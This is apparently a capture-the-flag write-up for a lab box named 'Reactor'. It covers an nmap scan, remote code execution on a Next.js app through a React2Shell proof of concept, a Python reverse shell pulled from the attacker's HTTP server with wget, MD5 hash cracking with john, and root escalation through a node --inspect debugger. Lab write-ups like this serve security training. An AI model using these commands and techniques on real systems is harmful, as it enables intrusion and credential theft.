# Reactor

## Nmap scan:
```
Nmap scan report for 10.129.7.254
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Wed, 03 Jun 2026 11:57:46 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 03 Jun 2026 11:57:47 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Wed, 03 Jun 2026 11:57:48 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.99%I=7%D=6/3%Time=6A2016BA%P=x86_64-pc-linux-gnu%r(Get
SF:Request,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-St
SF:ate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x20
SF:Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\r
SF:\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nCa
SF:che-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20171
SF:75\r\nDate:\x20Wed,\x2003\x20Jun\x202026\x2011:57:46\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta\
SF:x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\"
SF:/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/>
SF:<link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20h
SF:ref=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20s
SF:rc=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\"
SF:></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.j
SF:s\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rout
SF:er-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch
SF:\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Wed,\
SF:x2003\x20Jun\x202026\x2011:57:47\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RS
SF:C,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-S
SF:egment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x2
SF:0private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\
SF:nDate:\x20Wed,\x2003\x20Jun\x202026\x2011:57:48\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Writeup:
An initial nmap scan reveals an `http` service served over port 3000.
This seems to be a panel showing the status of some kind of reactor.
Notably, there is an on-site personnel section, this shows that three personnel are online.

- (online) Marcus Kim
- (online) Dr. Elena Rodriguez
- (offline) James Thompson

Not finding much on the main page I run a gobuster subdirectory enumeration command with the `big.txt` wordlist.
A UDP scan I ran reveals nothing of interest, simply a bunch of `open|filtered` ports, which in 99.999999% of cases means nothing.
After using wappalyzer, I discovered that the version of react being used was vulnerable to React2Shell.
Downloading a PoC (see submodule), I gained RCE as the `node` user.

First I read `/etc/passwd`
```
  ▸ engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
```

Of note was the user `engineer`.
Noting that `python3` was an available command, I found a reverse shell python script at [revshells](https://www.revshells.com).

I transferred this to the victim machine by running a `http` server over `port 80`, and then from the victim machine retrieving the created `python-rev.py` payload with `wget`.

Then I set up my listener with `nc -lvnp 9001` and executed the payload with `python3 python-rev.py`.
This popped an interactive reverse shell.

Previously I had noted a `reactor.db` sqlite3 database, with my new reverse shell I began enumerating this.
`.tables` returned two tables, those being `sensor_logs` and `users`.
Users, I read out with `select * from users;`, which returned the following output:

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Nice, hashes. These should be crackable.
Throwing these into `john`, with the `rockyou.txt` wordlist, I see that the password for the `engineer` user is `reactor1`.
This password also grants access through `ssh` as the `engineer` user.

A bit of enumeration reveals that a `/usr/bin/node` process is running as the`root` user, with the `--inspect` flag.
- `root        1413  0.0  1.2 1066408 48548 ?       Ssl  14:01   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`

This exposes a debug interface, which when exposed under the `root` user can be used to escalate privileges.
After a quick search, I find a script called `node-inspector-rce`, which can be used to successfully exploit this. (see submodule).

Running this, I pop a root shell and read `root.txt`, thus solving the box.

## Commands Used
- `sudo nmap -sC -sV -T4 -A -p- 10.129.7.254`
- `sudo nmap -sUV -F -T4 10.129.7.254`
- `gobuster dir --url 'http://reactor.htb:3000/' --wordlist ~/SecLists/Discovery/Web-Content/big.txt`
- `python3 exploit.py --target http://reactor.htb:3000 -c 'pwd'`
- `sudo python3 -m http.server 80`
- `python3 exploit.py --target http://reactor.htb:3000 -c 'wget http://10.10.15.217/python-rev.py'`
- `python3 python-rev.py`
- `john hashes.txt --format=raw-md5 --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt`
